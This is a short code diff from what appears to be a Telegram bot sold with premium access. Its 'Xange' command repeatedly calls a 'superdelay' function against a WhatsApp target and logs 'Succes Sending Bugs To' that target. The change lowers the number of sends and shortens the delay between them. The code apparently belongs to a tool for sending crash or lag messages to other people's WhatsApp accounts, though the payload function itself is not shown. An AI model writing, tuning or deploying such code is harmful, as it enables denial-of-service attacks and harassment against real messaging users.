@@ -2347,9 +2347,9 @@ bot.command("Xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
     },
   });
 
-  for (let i = 0; i < 20; i++) {
+  for (let i = 0; i < 5; i++) {
     await superdelay(sock, target);
-    await sleep(4000);
+    await sleep(1000);
     console.log(`Succes Sending Bugs To : ${target}`);
   }
 })
